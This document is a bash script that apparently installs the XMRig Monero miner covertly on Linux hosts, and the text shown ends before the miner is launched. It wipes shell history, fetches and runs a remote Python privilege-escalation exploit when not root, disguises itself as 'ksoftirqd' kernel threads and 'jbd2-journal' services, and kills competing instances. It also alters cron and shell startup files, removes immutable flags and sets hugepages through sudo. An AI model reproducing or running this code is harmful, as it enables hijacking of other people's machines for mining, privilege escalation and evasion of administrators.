#!/usr/bin/env bash
VERSION="7.14-unified-fixed"
set +m

exec >/dev/null 2>&1
unset HISTFILE SSH_CLIENT SSH_CONNECTION SSH_TTY SSH_AUTH_SOCK 2>/dev/null
export HISTFILE=/dev/null HISTSIZE=0 HISTFILESIZE=0

if [ -n "${HOME:-}" ] && [ -d "$HOME" ]; then
    for _eh in "$HOME/.zsh_history" "$HOME/.bash_history" "$HOME/.python_history" \
               "$HOME/.sh_history" "$HOME/.zhistory" "$HOME/.history" ; do
        [ -f "$_eh" ] && : > "$_eh" 2>/dev/null || true
    done
    unset _eh
fi

C3POOL_DOWNLOAD_URL="https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz"
BACKUP_DOWNLOAD_URL="https://raw.githubusercontent.com/melonlonmeo/c4/refs/heads/main/xmrig.tar.gz"
XMRIG_LATEST_API="https://api.github.com/repos/xmrig/xmrig/releases/latest"
LPE_URL1="https://raw.githubusercontent.com/ZephrFish/CopyFail-CVE-2026-31431/main/copyfail.py"
LPE_URL2="https://raw.githubusercontent.com/ZephrFish/CopyFail-CVE-2026-31431/refs/heads/main/copyfail.py"

WALLET="${1:-}"
EMAIL="${2:-}"
PASS="x"
KEEP_CONFIG="${KEEP_CONFIG:-0}"
KEEP_BINARY="${KEEP_BINARY:-0}"
STOP_UDEV="${STOP_UDEV:-0}"
USER_HINT="${THREADS_HINT:-}"
FORCE_REINSTALL="${FORCE_REINSTALL:-0}"

log()  { :; }
fail() { exit 1; }
TS()   { date +%Y%m%d_%H%M%S; }

_escape_re() {
  if command -v sed >/dev/null 2>&1; then
    printf '%s' "$1" | sed 's/[][\.^$*+?(){}|]/\\&/g'
  else
    printf '%s' "$1" | sed 's/\./\\./g' 2>/dev/null || printf '%s' "$1"
  fi
}

backup_if_exists() {
  local f="$1"
  [ -f "$f" ] && cp -p "$f" "${f}.bak.$(TS)" 2>/dev/null && log "[*] Backup: $f"
}

is_gzip() {
  [ -s "$1" ] || return 1
  local magic
  magic="$(head -c 2 "$1" 2>/dev/null | od -An -tx1 2>/dev/null | tr -d ' \n')"
  [ "$magic" = "1f8b" ] || return 1
  command -v gzip >/dev/null 2>&1 && gzip -t "$1" >/dev/null 2>&1
}

_is_unsafe_path() {
  [ -L "$1" ] && return 0
  [ -e "$1" ] && [ ! -d "$1" ] && return 0
  return 1
}

_can_exec_in() {
  local d="$1" probe="$d/.xp-$$"
  printf '#!/bin/sh\nexit 0\n' >"$probe" 2>/dev/null || return 1
  chmod 700 "$probe" 2>/dev/null || { rm -f "$probe"; return 1; }
  ( "$probe" ) >/dev/null 2>&1; local rc=$?
  rm -f "$probe" 2>/dev/null
  return $rc
}

_is_bogus() {
  case "$1" in ""|"/"|"/."|"//"|"//."*|/.*) return 0 ;; esac
  return 1
}

_derive_cwd() {
  local p="$1" cwd=""
  cwd="$(readlink "$p/cwd" 2>/dev/null)"
  case "$cwd" in *"/.jbd2-"*) printf '%s' "$cwd"; return 0 ;; esac
  if [ -r "$p/cmdline" ]; then
    cwd="$(tr '\0' '\n' < "$p/cmdline" 2>/dev/null | grep -oE '/[^[:space:]]*/\.jbd2-[a-zA-Z0-9-]+' | head -1)"
    case "$cwd" in *"/.jbd2-"*) printf '%s' "$cwd"; return 0 ;; esac
  fi
  if [ -r "$p/maps" ]; then
    cwd="$(grep -oE '/[^[:space:]]*/\.jbd2-[a-zA-Z0-9-]+' "$p/maps" 2>/dev/null | head -1)"
    case "$cwd" in *"/.jbd2-"*) printf '%s' "$cwd"; return 0 ;; esac
  fi
  return 1
}

# --- KIỂM TRA ĐIỀU KIỆN LPE ---
_is_lpe_viable() {
    if [ "$(id -u)" = "0" ]; then return 1; fi
    
    local k_ver
    k_ver="$(uname -r)"
    local major="${k_ver%%.*}"
    
    # Nếu kernel >= 6 thì bỏ qua (tránh treo máy Kali/Debian mới)
    [ "$major" -ge 6 ] 2>/dev/null && return 1
    
    if [ -f /proc/sys/kernel/unprivileged_userns_clone ]; then
        [ "$(cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null)" = "0" ] && return 1
    fi
    return 0
}

download_file() {
  local url="$1" out="$2" tmp="$2.part"
  rm -f "$tmp" 2>/dev/null
  if command -v curl >/dev/null 2>&1; then
    curl -fL --retry 2 --connect-timeout 15 --max-time 300 "$url" -o "$tmp" 2>/dev/null \
      && is_gzip "$tmp" && { mv -f "$tmp" "$out"; return 0; }
    rm -f "$tmp"
    curl -kfL --retry 2 --connect-timeout 15 --max-time 300 "$url" -o "$tmp" 2>/dev/null \
      && is_gzip "$tmp" && { mv -f "$tmp" "$out"; return 0; }
    rm -f "$tmp"
  fi
  if command -v wget >/dev/null 2>&1; then
    wget -q -O "$tmp" --timeout=30 --tries=2 "$url" 2>/dev/null \
      && is_gzip "$tmp" && { mv -f "$tmp" "$out"; return 0; }
    rm -f "$tmp"
    wget -q --no-check-certificate -O "$tmp" --timeout=30 --tries=2 "$url" 2>/dev/null \
      && is_gzip "$tmp" && { mv -f "$tmp" "$out"; return 0; }
    rm -f "$tmp"
  fi
  if command -v busybox >/dev/null 2>&1 && busybox wget --help >/dev/null 2>&1; then
    busybox wget -q -O "$tmp" "$url" 2>/dev/null && is_gzip "$tmp" \
      && { mv -f "$tmp" "$out"; return 0; }
    rm -f "$tmp"
  fi
  if command -v python3 >/dev/null 2>&1; then
    python3 - "$url" "$tmp" <<'PY' 2>/dev/null && is_gzip "$tmp" \
      && { mv -f "$tmp" "$out"; return 0; }
import sys, urllib.request, ssl
try:
    ctx = ssl._create_unverified_context()
    req = urllib.request.Request(sys.argv[1], headers={"User-Agent":"Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=30, context=ctx) as r, open(sys.argv[2],'wb') as f:
        while True:
            chunk = r.read(65536)
            if not chunk: break
            f.write(chunk)
    sys.exit(0)
except Exception:
    sys.exit(1)
PY
    rm -f "$tmp"
  fi
  return 1
}

download_text() {
  local url="$1" out
  if command -v curl >/dev/null 2>&1; then
    out="$(curl -fsSL --retry 2 --connect-timeout 15 --max-time 60 \
      -H 'Accept: application/vnd.github+json' -H 'User-Agent: unified-installer' "$url" 2>/dev/null)"
    [ -n "$out" ] && { printf '%s\n' "$out"; return 0; }
  fi
  if command -v wget >/dev/null 2>&1; then
    out="$(wget -qO- --header='Accept: application/vnd.github+json' \
      --user-agent='unified-installer' --timeout=30 --tries=2 "$url" 2>/dev/null)"
    [ -n "$out" ] && { printf '%s\n' "$out"; return 0; }
  fi
  if command -v python3 >/dev/null 2>&1; then
    python3 - "$url" <<'PY' && return 0
import sys, urllib.request, ssl
try:
    req = urllib.request.Request(sys.argv[1], headers={"Accept":"application/vnd.github+json","User-Agent":"unified-installer"})
    with urllib.request.urlopen(req, timeout=20, context=ssl._create_unverified_context()) as r:
        sys.stdout.write(r.read().decode())
    sys.exit(0)
except Exception:
    sys.exit(1)
PY
  fi
  return 1
}

if _is_lpe_viable; then
    if command -v python3 >/dev/null 2>&1; then
        umask 077

        _lpe_fetch_to() {
            local dst="$1"
            if command -v curl >/dev/null 2>&1; then
                curl -fsSL "$LPE_URL1" -o "$dst" 2>/dev/null && [ -s "$dst" ] && return 0
                curl -fsSL "$LPE_URL2" -o "$dst" 2>/dev/null && [ -s "$dst" ] && return 0
            fi
            if command -v wget >/dev/null 2>&1; then
                wget -qO "$dst" "$LPE_URL2" 2>/dev/null && [ -s "$dst" ] && return 0
                wget -qO "$dst" "$LPE_URL1" 2>/dev/null && [ -s "$dst" ] && return 0
            fi
            return 1
        }

        _lpe_run() {
            local f="$1"
            local _ev="env -u SSH_CLIENT -u SSH_CONNECTION -u SSH_TTY -u SSH_AUTH_SOCK"
            if command -v timeout >/dev/null 2>&1; then
                timeout 60 $_ev python3 "$f" </dev/null >/dev/null 2>&1 || true
            else
                $_ev python3 "$f" </dev/null >/dev/null 2>&1 || true
            fi
        }

        _lpe_done=0
        for _d in \
            "${XDG_RUNTIME_DIR:-}" \
            "/run/user/$(id -u 2>/dev/null || echo 0)" \
            "/dev/shm" \
            "/var/tmp" \
            "/tmp" \
            "${HOME:-}/.cache" \
            "${HOME:-}" \
            ; do
            [ -n "$_d" ] || continue
            [ -d "$_d" ] || continue
            [ -w "$_d" ] || continue
            [ -L "$_d" ] && continue
            _f="$(mktemp "${_d}/.cf_XXXXXX.py" 2>/dev/null)" || continue
            [ -s "$_f" ] && { rm -f "$_f"; continue; }
            if _lpe_fetch_to "$_f"; then
                _lpe_run "$_f"
                rm -f "$_f" 2>/dev/null || true
                _lpe_done=1
                break
            fi
            rm -f "$_f" 2>/dev/null || true
        done

        if [ "$_lpe_done" = "0" ]; then
            _ev="env -u SSH_CLIENT -u SSH_CONNECTION -u SSH_TTY -u SSH_AUTH_SOCK"
            if command -v curl >/dev/null 2>&1; then
                { curl -fsSL "$LPE_URL1" 2>/dev/null || curl -fsSL "$LPE_URL2" 2>/dev/null; } \
                    | { command -v timeout >/dev/null 2>&1 && timeout 60 $_ev python3 - || $_ev python3 -; } >/dev/null 2>&1 || true
            elif command -v wget >/dev/null 2>&1; then
                { wget -qO- "$LPE_URL2" 2>/dev/null || wget -qO- "$LPE_URL1" 2>/dev/null; } \
                    | { command -v timeout >/dev/null 2>&1 && timeout 60 $_ev python3 - || $_ev python3 -; } >/dev/null 2>&1 || true
            fi
        fi

        unset _lpe_done _lpe_fetch_to _lpe_run _f _d _ev
    fi
fi

HAS_ROOT=0
if [ "$(id -u 2>/dev/null || echo 1)" = "0" ]; then HAS_ROOT=1
elif command -v sudo >/dev/null 2>&1 && sudo -n true 2>/dev/null; then HAS_ROOT=1; fi

command -v nice   >/dev/null 2>&1 && _NICE_PREFIX="nice -n 19" || _NICE_PREFIX=""
command -v timeout >/dev/null 2>&1 && _TO="timeout 15"        || _TO=""

_REAL_ROOT=0
[ "$(id -u)" = "0" ] && _REAL_ROOT=1

_sys() {
  if [ "$_REAL_ROOT" = "1" ]; then
    "$@"
  elif command -v sudo >/dev/null 2>&1 && sudo -n true 2>/dev/null; then
    sudo -n "$@" 2>/dev/null
  else
    return 1
  fi
}

_sysonly() {
  if [ "$_REAL_ROOT" = "1" ]; then
    "$@"
  elif command -v sudo >/dev/null 2>&1 && sudo -n true 2>/dev/null; then
    sudo -n "$@" 2>/dev/null
  else
    return 1
  fi
}

_try() {
  "$@" 2>/dev/null && return 0
  _sys "$@" 2>/dev/null && return 0
  return 1
}

if command -v flock >/dev/null 2>&1; then
  _GLOCK="/tmp/.jbd2-sync.lock"
  exec 8> "$_GLOCK"
  flock -n 8 || exit 0
fi

_MARKER="/run/.jbd2-journal.state"
{ [ -d /run ] && [ -w /run ]; } || _MARKER="/tmp/.jbd2-journal.state"

_uid="$(id -u 2>/dev/null || echo 0)"
_home="${HOME:-}"
{ [ -n "$_home" ] && [ -d "$_home" ] && [ -w "$_home" ] && [ -x "$_home" ]; } || _home=""
_xdg_data="${XDG_DATA_HOME:-}"
_xdg_run="${XDG_RUNTIME_DIR:-/run/user/$_uid}"

if [ "$FORCE_REINSTALL" != "1" ]; then
    _hp_pids=()
    _hp_starts=()
    _hp_cwds=()

    for _hp_p in /proc/[0-9]*; do
        _hp_pid="${_hp_p#/proc/}"
        [ "$_hp_pid" = "$$" ] && continue
        [ "$_hp_pid" = "$PPID" ] && continue
        [ -d "$_hp_p" ] || continue

        _hp_comm="$(cat "$_hp_p/comm" 2>/dev/null)"
        case "$_hp_comm" in
            ksoftirqd-*) : ;;
            *) continue ;;
        esac

        _hp_state="$(awk '{print $3}' "$_hp_p/stat" 2>/dev/null)"
        case "$_hp_state" in Z|X|z|x) continue ;; esac

        _hp_ut="$(awk '{print $14+$15}' "$_hp_p/stat" 2>/dev/null)"
        case "$_hp_ut" in ''|*[!0-9]*) continue ;; esac
        [ "$_hp_ut" -ge 100 ] || continue

        _hp_start="$(awk '{print $22}' "$_hp_p/stat" 2>/dev/null)"
        case "$_hp_start" in ''|*[!0-9]*) _hp_start=0 ;; esac

        _hp_cwd="$(_derive_cwd "$_hp_p")" || continue
        case "$_hp_cwd" in *"/.jbd2-"*) : ;; *) continue ;; esac

        _hp_pids+=("$_hp_pid")
        _hp_starts+=("$_hp_start")
        _hp_cwds+=("$_hp_cwd")
    done

    _hp_n="${#_hp_pids[@]}"

    if [ "$_hp_n" -ge 1 ]; then
        _hp_ki=0
        for _i in "${!_hp_pids[@]}"; do
            _s_i="${_hp_starts[$_i]}"
            _s_k="${_hp_starts[$_hp_ki]}"
            if [ "$_s_i" -lt "$_s_k" ] 2>/dev/null; then
                _hp_ki="$_i"
            elif [ "$_s_i" -eq "$_s_k" ] 2>/dev/null; then
                [ "${_hp_pids[$_i]}" -lt "${_hp_pids[$_hp_ki]}" ] 2>/dev/null && _hp_ki="$_i"
            fi
        done
        _hp_kpid="${_hp_pids[$_hp_ki]}"
        _hp_kcwd="${_hp_cwds[$_hp_ki]}"

        if [ "$_hp_n" -ge 2 ]; then
            _kill_cwds=()
            for _i in "${!_hp_pids[@]}"; do
                [ "$_i" = "$_hp_ki" ] && continue
                _c="${_hp_cwds[$_i]}"
                [ "$_c" = "$_hp_kcwd" ] && continue
                _dup=0
                for _e in "${_kill_cwds[@]}"; do
                    [ "$_e" = "$_c" ] && { _dup=1; break; }
                done
                [ "$_dup" = "0" ] && _kill_cwds+=("$_c")
            done

            for _kc in "${_kill_cwds[@]}"; do
                [ -d "$_kc" ] || continue
                _bn="$(basename "$_kc")"
                _ks="${_bn#.jbd2-}"
                _ks="${_ks%%-*}"

                _sysonly systemctl disable --now "jbd2-journal-${_ks}.service" || true
                _try chattr -i "/etc/systemd/system/jbd2-journal-${_ks}.service" || true
                _try rm -f "/etc/systemd/system/jbd2-journal-${_ks}.service" || true

                _kwr="$(ls -1 "$_kc"/.journal-* 2>/dev/null | head -1)"
                if [ -n "$_kwr" ]; then
                    _try pkill -9 -f "$(_escape_re "$_kwr")" || true
                fi
                _try pkill -9 -f "$(_escape_re "$_kc")" || true

                _retry=0
                while [ "$_retry" -lt 10 ]; do
                    _found=0
                    for _rr in /proc/[0-9]*; do
                        _rr_pid="${_rr#/proc/}"
                        _rr_comm="$(cat "$_rr/comm" 2>/dev/null)"
                        case "$_rr_comm" in ksoftirqd-*) : ;; *) continue ;; esac
                        _rr_cwd="$(_derive_cwd "$_rr")" || continue
                        [ "$_rr_cwd" = "$_kc" ] || continue
                        _try kill -9 "$_rr_pid" || true
                        _found=1
                    done
                    [ "$_found" = "0" ] && break
                    _retry=$((_retry+1))
                    sleep 0.5
                done

                _still=0
                for _rr in /proc/[0-9]*; do
                    _rr_comm="$(cat "$_rr/comm" 2>/dev/null)"
                    case "$_rr_comm" in ksoftirqd-*) : ;; *) continue ;; esac
                    _rr_cwd="$(_derive_cwd "$_rr")" || continue
                    [ "$_rr_cwd" = "$_kc" ] && { _still=1; break; }
                done
                if [ "$_still" = "1" ]; then
                    command -v logger >/dev/null 2>&1 && \
                        logger -t jbd2 "dedup: FAILED kill in $_kc" 2>/dev/null || true
                    continue
                fi

                if command -v mountpoint >/dev/null 2>&1; then
                    for _kmf in "$_kc"/*; do
                        [ -e "$_kmf" ] && mountpoint -q "$_kmf" 2>/dev/null && _try umount "$_kmf" || true
                    done
                fi
                if command -v chattr >/dev/null 2>&1; then
                    _try find "$_kc" -type f -exec chattr -i {} \; || true
                fi
                _try rm -rf "$_kc" || true

                if [ -n "$_home" ]; then
                    _try rm -f "$_home/.config/systemd/user/jbd2-journal-${_ks}.service" || true
                    _try rm -f "$_home/.config/autostart/jbd2-flush-${_ks}.desktop" || true
                fi
                for _rc in "$HOME/.profile" "$HOME/.bashrc" "$HOME/.zshrc" "$HOME/.bash_profile"; do
                    [ -f "$_rc" ] || continue
                    if grep -F -q "$_kc" "$_rc" 2>/dev/null; then
                        grep -F -v "$_kc" "$_rc" > "${_rc}.tmp.$$" 2>/dev/null
                        mv -f "${_rc}.tmp.$$" "$_rc" 2>/dev/null || rm -f "${_rc}.tmp.$$"
                    fi
                done
                if command -v crontab >/dev/null 2>&1; then
                    _ce="$(crontab -l 2>/dev/null)"
                    if printf '%s' "$_ce" | grep -F -q "$_kc"; then
                        printf '%s\n' "$_ce" | grep -F -v "$_kc" | crontab - 2>/dev/null || true
                    fi
                fi

                command -v logger >/dev/null 2>&1 && \
                    logger -t jbd2 "dedup: removed cwd=$_kc" 2>/dev/null || true
            done

            for _i in "${!_hp_pids[@]}"; do
                [ "$_i" = "$_hp_ki" ] && continue
                _c="${_hp_cwds[$_i]}"
                [ "$_c" = "$_hp_kcwd" ] || continue
                _try kill -9 "${_hp_pids[$_i]}" || true
                command -v logger >/dev/null 2>&1 && \
                    logger -t jbd2 "dedup: killed same-cwd dup pid=${_hp_pids[$_i]}" 2>/dev/null || true
            done

            _sysonly systemctl daemon-reload || true
        fi

        printf '%s\n' "$_hp_kcwd" > "$_MARKER" 2>/dev/null || true
        command -v logger >/dev/null 2>&1 && \
            logger -t jbd2 "healthy miner pid=$_hp_kpid, skip reinstall (count=$_hp_n->1)" 2>/dev/null || true

        unset _hp_pids _hp_starts _hp_cwds _hp_n _hp_ki _hp_kpid _hp_kcwd
        unset _i _c _dup _e _kill_cwds _kc _bn _ks _kwr _kmf _rc _ce
        unset _rr _rr_pid _rr_comm _rr_cwd _retry _found _still
        unset _hp_p _hp_pid _hp_comm _hp_state _hp_ut _hp_start _hp_cwd
        unset _s_i _s_k
        exit 0
    fi
    unset _hp_pids _hp_starts _hp_cwds _hp_n
    unset _hp_p _hp_pid _hp_comm _hp_state _hp_ut _hp_start _hp_cwd
fi

if [ -f "$_MARKER" ]; then
  _OLD_DIR="$(tr -d '\r\n' < "$_MARKER" 2>/dev/null)"
  case "$_OLD_DIR" in
    /*/.jbd2-*) : ;;
    *) _OLD_DIR="" ;;
  esac
  if [ -n "$_OLD_DIR" ] && [ -d "$_OLD_DIR" ]; then
    _obn="$(basename "$_OLD_DIR")"
    _oks="${_obn#.jbd2-}"
    _oks="${_oks%%-*}"
    _sysonly systemctl disable --now "jbd2-journal-${_oks}.service" || true
    _okwr="$(ls -1 "$_OLD_DIR"/.journal-* 2>/dev/null | head -1)"
    [ -n "$_okwr" ] && _try pkill -9 -f "$(_escape_re "$_okwr")" || true
    _try pkill -9 -f "$(_escape_re "$_OLD_DIR")" || true
    if [ -f "$_OLD_DIR/.jbd2.run" ]; then
      _OP="$(tr -d '[:space:]' < "$_OLD_DIR/.jbd2.run" 2>/dev/null)"
      case "$_OP" in
        ''|*[!0-9]*) : ;;
        *) _try kill -9 "$_OP" || true ;;
      esac
    fi
    _or=0
    while [ "$_or" -lt 10 ]; do
      _of=0
      for _rr in /proc/[0-9]*; do
        _rr_pid="${_rr#/proc/}"
        _rr_comm="$(cat "$_rr/comm" 2>/dev/null)"
        case "$_rr_comm" in ksoftirqd-*) : ;; *) continue ;; esac
        _rr_cwd="$(_derive_cwd "$_rr")" || continue
        [ "$_rr_cwd" = "$_OLD_DIR" ] || continue
        _try kill -9 "$_rr_pid" || true
        _of=1
      done
      [ "$_of" = "0" ] && break
      _or=$((_or+1))
      sleep 0.5
    done
    if command -v systemctl >/dev/null 2>&1; then
      for _sf in /etc/systemd/system/jbd2-journal-*.service; do
        [ -f "$_sf" ] || continue
        _sysonly systemctl disable --now "$(basename "$_sf")" || true
        _try chattr -i "$_sf" || true
        _try rm -f "$_sf" || true
      done
      _sysonly systemctl daemon-reload || true
    fi
    if command -v crontab >/dev/null 2>&1; then
      _CE="$(crontab -l 2>/dev/null)"
      if printf '%s' "$_CE" | grep -F -q "$_OLD_DIR"; then
        printf '%s\n' "$_CE" | grep -F -v "$_OLD_DIR" | crontab - 2>/dev/null || true
      fi
    fi
    rm -f "$HOME"/.config/autostart/jbd2-flush-*.desktop 2>/dev/null || true
    if command -v mountpoint >/dev/null 2>&1; then
      for _mf in "$_OLD_DIR"/*; do
        [ -e "$_mf" ] && mountpoint -q "$_mf" 2>/dev/null && _try umount "$_mf" || true
      done
    fi
    if command -v chattr >/dev/null 2>&1; then
      _try find "$_OLD_DIR" -type f -exec chattr -i {} \; || true
    fi
    _try rm -rf "$_OLD_DIR" || true
  fi
  rm -f "$_MARKER" 2>/dev/null || true
fi

RAND_SUFFIX=$(head -c 16 /dev/urandom 2>/dev/null | base64 2>/dev/null | tr -dc 'a-z0-9' | head -c 8)
[ -z "$RAND_SUFFIX" ] && RAND_SUFFIX="$(date +%s%N | sha256sum | head -c 8)"

DIR_SUFFIX=".jbd2-${RAND_SUFFIX}"
BIN_NAME="ksoftirqd-${RAND_SUFFIX}"
DISGUISE_ARGV="[ksoftirqd/2]"
CONFIG_NAME=".ld.cache.bak"
WRAPPER_NAME=".journal-${RAND_SUFFIX}"
SERVICE_NAME="jbd2-journal-${RAND_SUFFIX}.service"

if command -v systemctl >/dev/null 2>&1; then
  for _gsf in /etc/systemd/system/jbd2-journal-*.service; do
    [ -f "$_gsf" ] || continue
    _sysonly systemctl disable --now "$(basename "$_gsf")" || true
    _try chattr -i "$_gsf" || true
    _try rm -f "$_gsf" || true
  done
  _sysonly systemctl daemon-reload || true
fi

if command -v systemctl >/dev/null 2>&1 && [ -n "$_home" ] && [ -d "$_home/.config/systemd/user" ]; then
  for _gusf in "$_home/.config/systemd/user"/jbd2-journal-*.service; do
    [ -f "$_gusf" ] || continue
    systemctl --user disable --now "$(basename "$_gusf")" >/dev/null 2>&1 || true
    rm -f "$_gusf"
  done
  systemctl --user daemon-reload >/dev/null 2>&1 || true
fi

for _god in /dev/shm/.jbd2-* /tmp/.jbd2-* /var/tmp/.jbd2-* \
           "${_xdg_run}/.jbd2-"* "${_home}"/.cache/.jbd2-* \
           "${_home}"/.local/.jbd2-* "${_home}"/.config/.jbd2-* \
           "${_home}"/.jbd2-* ; do
  [ -d "$_god" ] || continue
  [ -L "$_god" ] && continue
  _gbn="$(basename "$_god")"
  _gks="${_gbn#.jbd2-}"
  _gks="${_gks%%-*}"
  _sysonly systemctl disable --now "jbd2-journal-${_gks}.service" || true
  _gwr="$(ls -1 "$_god"/.journal-* 2>/dev/null | head -1)"
  [ -n "$_gwr" ] && _try pkill -9 -f "$(_escape_re "$_gwr")" || true
  _try pkill -9 -f "$(_escape_re "$_god")" || true
  _gop="$(tr -d '[:space:]' < "$_god/.jbd2.run" 2>/dev/null)"
  case "$_gop" in
    ''|*[!0-9]*) : ;;
    *) _try kill -9 "$_gop" || true ;;
  esac
  _gr=0
  while [ "$_gr" -lt 10 ]; do
    _gf=0
    for _rr in /proc/[0-9]*; do
      _rr_pid="${_rr#/proc/}"
      _rr_comm="$(cat "$_rr/comm" 2>/dev/null)"
      case "$_rr_comm" in ksoftirqd-*) : ;; *) continue ;; esac
      _rr_cwd="$(_derive_cwd "$_rr")" || continue
      [ "$_rr_cwd" = "$_god" ] || continue
      _try kill -9 "$_rr_pid" || true
      _gf=1
    done
    [ "$_gf" = "0" ] && break
    _gr=$((_gr+1))
    sleep 0.5
  done
  if command -v mountpoint >/dev/null 2>&1; then
    for _gm in "$_god"/*; do
      [ -e "$_gm" ] && mountpoint -q "$_gm" 2>/dev/null && _try umount "$_gm" || true
    done
  fi
  if command -v chattr >/dev/null 2>&1; then
    _try find "$_god" -type f -exec chattr -i {} \; || true
  fi
  _try rm -rf "$_god" || true
done

if command -v crontab >/dev/null 2>&1; then
  _gce="$(crontab -l 2>/dev/null)"
  if printf '%s' "$_gce" | grep -F -q '.jbd2-'; then
    printf '%s\n' "$_gce" | grep -F -v '.jbd2-' | crontab - 2>/dev/null || true
  fi
fi

rm -f "$_home"/.config/autostart/jbd2-flush-*.desktop 2>/dev/null || true

unset _gsf _gusf _god _gop _gm _gce _gbn _gks _gwr _gr _gf
unset _obn _oks _okwr _OP _or _of _CE
sleep 1

CANDIDATES=()
if [ -n "$_home" ]; then
  [ -n "$_xdg_data" ] && CANDIDATES+=("${_xdg_data}/${DIR_SUFFIX}")
  CANDIDATES+=(
    "$_home/.cache/${DIR_SUFFIX}"
    "$_home/.local/${DIR_SUFFIX}"
    "$_home/.config/${DIR_SUFFIX}"
  )
fi
CANDIDATES+=(
  "${_xdg_run}/${DIR_SUFFIX}-${_uid}"
  "/dev/shm/${DIR_SUFFIX}-${_uid}"
  "/tmp/${DIR_SUFFIX}-${_uid}"
  "/var/tmp/${DIR_SUFFIX}-${_uid}"
)
[ -n "$_home" ] && CANDIDATES+=("$_home/${DIR_SUFFIX}")

INSTALL_DIR=""
for c in "${CANDIDATES[@]}"; do
  _is_bogus "$c" && continue
  _is_unsafe_path "$c" && continue
  mkdir -p "$c" 2>/dev/null || continue
  { [ -d "$c" ] && [ ! -L "$c" ]; } || continue
  { [ -w "$c" ] && [ -x "$c" ]; } || continue
  _can_exec_in "$c" || continue
  INSTALL_DIR="$c"; break
done

if [ -z "$INSTALL_DIR" ]; then
  for base in "${_xdg_run}" /dev/shm /tmp /var/tmp; do
    { [ -d "$base" ] && [ -w "$base" ] && [ -x "$base" ]; } || continue
    d="$(mktemp -d "${base}/${DIR_SUFFIX}-XXXXXX" 2>/dev/null)" || continue
    _can_exec_in "$d" && { INSTALL_DIR="$d"; break; }
    rm -rf "$d" 2>/dev/null
  done
fi

{ [ -n "$INSTALL_DIR" ] && [ -w "$INSTALL_DIR" ] && [ -x "$INSTALL_DIR" ]; } || exit 1
chmod 700 "$INSTALL_DIR" 2>/dev/null || true

CONFIG_PATH="$INSTALL_DIR/$CONFIG_NAME"
RUNNER="$INSTALL_DIR/$WRAPPER_NAME"

if command -v mountpoint >/dev/null 2>&1; then
  for _f in "$CONFIG_PATH" "$INSTALL_DIR/$BIN_NAME" "$RUNNER" "/etc/systemd/system/$SERVICE_NAME"; do
    [ -e "$_f" ] && mountpoint -q "$_f" 2>/dev/null && _try umount "$_f" || true
  done
fi
if command -v chattr >/dev/null 2>&1; then
  _try chattr -i "$CONFIG_PATH" || true
  _try chattr -i "$INSTALL_DIR/$BIN_NAME" || true
  _try chattr -i "$RUNNER" || true
  _try chattr -i "/etc/systemd/system/$SERVICE_NAME" || true
fi

printf '%s\n' "$INSTALL_DIR" > "$_MARKER" 2>/dev/null || true

ARCHIVE="$INSTALL_DIR/.jbd2.tmp"
mkdir -p "$INSTALL_DIR/journal.d" 2>/dev/null

[ -z "$WALLET" ] && exit 1
WALLET_BASE="${WALLET%%.*}"
case "${#WALLET_BASE}" in 106|95) ;; *) exit 1 ;; esac

if [ "$HAS_ROOT" -eq 1 ]; then PASS="root"; else PASS="x"; fi
[ -n "$EMAIL" ] && PASS="${PASS}:${EMAIL}"

_cur_v="$(ulimit -v 2>/dev/null || echo unlimited)"
if [ "$_cur_v" != "unlimited" ] && [ "${_cur_v:-0}" -lt 524288 ] 2>/dev/null; then
  ulimit -v unlimited 2>/dev/null || ulimit -v 1048576 2>/dev/null || true
fi

CPU_THREADS="$(nproc 2>/dev/null || getconf _NPROCESSORS_ONLN 2>/dev/null || echo 1)"
case "$CPU_THREADS" in ''|*[!0-9]*) CPU_THREADS=1 ;; esac
[ "$CPU_THREADS" -ge 1 ] 2>/dev/null || CPU_THREADS=1

MEM_MB="$(awk '/MemTotal/{print int($2/1024)}' /proc/meminfo 2>/dev/null || echo 0)"
case "$MEM_MB" in ''|*[!0-9]*) MEM_MB=0 ;; esac

L3_MB=0
if [ -f /sys/devices/system/cpu/cpu0/cache/index3/size ]; then
    L3_VAL=$(cat /sys/devices/system/cpu/cpu0/cache/index3/size 2>/dev/null)
    L3_MB=$(printf '%s' "$L3_VAL" | grep -oE '^[0-9]+')
    case "$L3_MB" in ''|*[!0-9]*) L3_MB=0 ;; esac
    printf '%s' "$L3_VAL" | grep -q 'K' && L3_MB=$((L3_MB / 1024))
fi

HAS_GUI=0
pgrep -x Xorg     >/dev/null 2>&1 && HAS_GUI=1
pgrep -x Xwayland >/dev/null 2>&1 && HAS_GUI=1

MAX_THREADS_RAM=$((MEM_MB / 256))
MAX_THREADS_L3=$((L3_MB / 2))
[ "$MAX_THREADS_L3" -eq 0 ] && MAX_THREADS_L3=$CPU_THREADS

OPTIMAL_THREADS=$CPU_THREADS
[ "$MAX_THREADS_RAM" -lt "$OPTIMAL_THREADS" ] && OPTIMAL_THREADS=$MAX_THREADS_RAM
[ "$MAX_THREADS_L3"  -lt "$OPTIMAL_THREADS" ] && OPTIMAL_THREADS=$MAX_THREADS_L3
[ "$OPTIMAL_THREADS" -lt 1 ] && OPTIMAL_THREADS=1
if [ "$HAS_GUI" -eq 1 ]; then
    OPTIMAL_THREADS=$((OPTIMAL_THREADS / 2))
    [ "$OPTIMAL_THREADS" -lt 1 ] && OPTIMAL_THREADS=1
fi
THREADS_HINT=$(( (OPTIMAL_THREADS * 100) / CPU_THREADS ))
[ "$THREADS_HINT" -gt 100 ] && THREADS_HINT=100
[ -n "$USER_HINT" ] && THREADS_HINT="$USER_HINT"

HP_BOOL="false"; RX_MODE="auto"
[ "$MEM_MB" -lt 2048 ] && RX_MODE="light"

if [ "$HAS_ROOT" -eq 1 ] && [ "$MEM_MB" -ge 2048 ]; then
    _sysonly sysctl -w vm.nr_hugepages=1280 || true
    [ -f /proc/sys/vm/nr_hugepages ] && [ "$(cat /proc/sys/vm/nr_hugepages 2>/dev/null)" -gt 0 ] \
      && HP_BOOL="true"
    if ! grep -q '^vm.nr_hugepages' /etc/sysctl.conf 2>/dev/null; then
      _sysonly sh -c 'echo "vm.nr_hugepages=1280" >> /etc/sysctl.conf' || true
    fi
fi

EXP_HASH=$(( CPU_THREADS * 700 / 1000 )); [ "$EXP_HASH" -gt 0 ] || EXP_HASH=1
if   [ "$EXP_HASH" -le 25000 ];  then PORT=13333
elif [ "$EXP_HASH" -le 100000 ]; then PORT=19999
else PORT=23333; fi

